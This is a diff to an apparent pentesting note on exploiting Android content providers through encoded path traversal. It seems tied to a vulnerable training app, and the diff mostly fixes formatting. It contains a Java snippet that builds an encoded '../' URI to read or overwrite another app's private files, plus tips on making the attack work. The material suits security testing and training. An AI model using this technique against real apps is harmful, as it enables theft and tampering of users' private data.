@@ -6,12 +6,12 @@ or `uri.getPath()` without canonicalization.
 **Exploit technique:** percent-encode traversal slashes before building the URI
 (`Uri.encode(target, "")`) so `../` survives Android's path-segment splitting:
 
-\`\`\`java
+```java
 String target = "../../../../data/data/<victim.pkg>/<private/path>";
 Uri uri = Uri.parse("content://<authority>/" + Uri.encode(target, ""));
 getContentResolver().openInputStream(uri);  // read
 getContentResolver().openOutputStream(uri); // write (needs file to already exist unless MODE_CREATE is honored)
-\`\`\`
+```
 
 **Gotchas:**
 - Package Visibility (API 30+) requires `<queries>` in the attacker manifest for
@@ -21,5 +21,3 @@ getContentResolver().openOutputStream(uri); // write (needs file to already exis
 - Check whether the provider honors the requested `mode` or hardcodes
   `MODE_READ_WRITE`/omits `MODE_CREATE` — determines read-only vs. full write vs.
   overwrite-only impact.
-
-Full writeup: [targets/ovaa/theftoverwrite-provider.md](../targets/ovaa/theftoverwrite-provider.md)
